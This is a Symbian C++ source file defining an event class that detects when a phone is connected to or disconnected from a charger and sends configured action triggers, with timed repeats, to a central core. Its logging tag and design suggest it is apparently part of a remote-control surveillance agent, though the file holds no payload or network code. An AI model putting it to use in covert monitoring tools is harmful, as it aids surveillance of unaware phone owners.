/*
 * EventAc.cpp
 *
 *  Created on: 26/set/2010
 *      Author: Giovanna
 */

#include "EventAc.h"
#include "Json.h"

CEventAc::CEventAc(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_AC, aTriggerId),iBatteryInfoPckg(iBatteryInfo)
	{
	// No implementation required
	}

CEventAc::~CEventAc()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;
	delete iTimerRepeat;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventAc* CEventAc::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventAc* self = new (ELeave) CEventAc(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventAc* CEventAc::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventAc* self = CEventAc::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventAc::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventAc.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			rootObject->GetIntL(_L("end"),iAcParams.iExitAction);
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iAcParams.iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iAcParams.iIter);
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				{
				rootObject->GetIntL(_L("delay"),iAcParams.iDelay);
				if(iAcParams.iDelay == 0)
					iAcParams.iDelay = 1;
				}
			}
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
				
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	if((iAcParams.iRepeatAction != -1) && (iAcParams.iDelay != -1))
		{
		iTimerRepeat = CTimeOutTimer::NewL(*this);
		iSecondsIntervRepeat = iAcParams.iDelay;
		}
	else
		iTimerRepeat = NULL;
	
	iPhone = CPhone::NewL();
	iPhone->SetObserver(this);
	
	__FLOG(_L("End ConstructL"));
	}

void CEventAc::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	
	iEnabled = ETrue;
	
	// Initialize Properly the iWasConnectedToCharger value, 
	iWasConnectedToCharger = ConnectedToCharger();
	
	if(iWasConnectedToCharger)
		{
		__FLOG(_L("I was connected to charger"));
		SendActionTriggerToCoreL();
		//start repeat action
		if((iAcParams.iRepeatAction != -1) && (iAcParams.iDelay != -1))
			{
			iSteps = iAcParams.iIter;
			
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
			}
		}
	
	// Receives change notifications of the battery status
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	
	}

void CEventAc::StopEventL()
	{
	if(iTimerRepeat != NULL)
		iTimerRepeat->Cancel();
	iPhone->Cancel();
	iEnabled = EFalse;
	}

TBool CEventAc::ConnectedToCharger()
	{
	__FLOG(_L("ConnectedToCharger()"));
	
	TChargerStatus chargerStatus;
	iPhone->GetAcIndicatorSync(chargerStatus);
		
	if(chargerStatus == EChargerStatusUnknown)
		{
		// retrieve the info via battery info
		TUint chargeLevel=0;
		CTelephony::TBatteryStatus batteryStatus;
		iPhone->GetBatteryInfoSync(chargeLevel, batteryStatus);
		if((batteryStatus == CTelephony::EBatteryConnectedButExternallyPowered) || (batteryStatus == CTelephony::ENoBatteryConnected))
			return ETrue;
		else
			return EFalse;
		}
	else if(chargerStatus == EChargerStatusConnected)
		{
		return ETrue;
		}
	return EFalse;
	}


void CEventAc::HandlePhoneEventL(TPhoneFunctions event)
	{
	__FLOG(_L("HandlePhoneEventL"));
	
	if (event != ENotifyBatteryStatusChange)
		return;

	if (ConnectedToCharger())
		{
		// connected
		// Before trigger the event perform an additional check, just in case.
		if (!iWasConnectedToCharger)
			{
			// Triggers the In-Action
			iWasConnectedToCharger = ETrue;
			SendActionTriggerToCoreL();
			// Triggers the Repeat-Action
			if((iAcParams.iRepeatAction != -1) && (iAcParams.iDelay != -1))
				{
				iSteps = iAcParams.iIter;
						
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->RcsAt(iTimeAtRepeat);
				}
			}
		}
	else
		{
		// not connected
		if (iWasConnectedToCharger)
			{
			// Stop the repeat action
			if(iTimerRepeat != NULL)
				iTimerRepeat->Cancel();
			// Triggers the unplug action
			iWasConnectedToCharger = EFalse;
			if (iAcParams.iExitAction != -1)
				{
				SendActionTriggerToCoreL(iAcParams.iExitAction);
				}
			}
		}
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	}

void CEventAc::TimerExpiredL(TAny* /*src*/)
	{
	if(iAcParams.iIter == -1)
		{
		// infinite loop
		// restart timer
		iTimeAtRepeat.HomeTime();
		iTimeAtRepeat += iSecondsIntervRepeat;
		iTimerRepeat->RcsAt(iTimeAtRepeat);
		SendActionTriggerToCoreL(iAcParams.iRepeatAction);
		}
	else
		{
		// finite loop
		if(iSteps > 0)
			{
			// still something to do
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
			--iSteps;
			SendActionTriggerToCoreL(iAcParams.iRepeatAction);
			}
		}
	}
